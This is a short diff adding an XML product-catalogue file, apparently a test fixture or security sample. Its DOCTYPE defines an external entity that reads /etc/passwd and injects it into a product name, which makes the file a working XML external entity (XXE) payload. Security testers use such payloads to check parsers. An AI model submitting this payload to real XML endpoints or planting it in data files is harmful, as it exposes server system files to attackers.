@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE products [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<products><product><name>&xxe;</name><price>1.00</price><stock>1</stock></product></products>
